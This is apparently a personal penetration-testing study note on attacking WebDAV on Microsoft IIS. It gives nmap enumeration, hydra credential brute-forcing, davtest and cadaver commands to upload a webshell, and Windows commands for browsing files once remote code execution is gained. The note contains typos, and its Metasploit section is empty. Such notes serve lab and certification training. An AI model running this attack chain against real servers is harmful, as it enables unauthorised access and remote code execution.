Related to [[Metasploit]] and [[Windows Vulnerabilities]]

Microsfoft IIs is a propierary extensible web server software developed by microsoft, its used to host webs and webapps.

Typically configured on port 80/443

WebDAV (Web based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allows users to collaborateively edit and manage files on remote web servers

The first step of exploitation involves identifying whether webDAV has been configured to run on an IIS server.
We can perform burteforce in order to obtain credentials.
Once we have credentials we can upload a malicious .asp file for RCE or RSSH

We will use davtest and cadaver

We can start using:

``` bash
nmap -sV -p 80 --script=http-enum [IP]
```

When we find the webdav directory we can use hydra for a bruteforce:

``` bash
hydra -L [username_file] -P [password_file] [IP/domain] [protocol (http-get)] [directory (/webdav/)]
```

Once we have a login we can use davtest:

``` bash
davtest -url [url_with_webdavdir] -auth [username]:[password]
```

Now we know which types of files we can upload so now we can use cadaver:

``` bash
cadaver http://[IP/domain]/[webdavdir]
```

It will ask us for auth, then we have a sudo shell for the webdav dir, we can use this for a webshell

We can check all available webshells with 

``` bash
ls -al /usr/share/webshells/
```

Check the correct file extension we can upload, then with cadaver use:

``` bash
put [webshell_path]
```

Then we should open it from the browser, where it may be an RCE box or  reverse shell

To list all dirs from a command box:

``` bash
dir C:\
```

To read files:

``` bash
type C:\[path]
```

---

### Using [[Metasploit]]


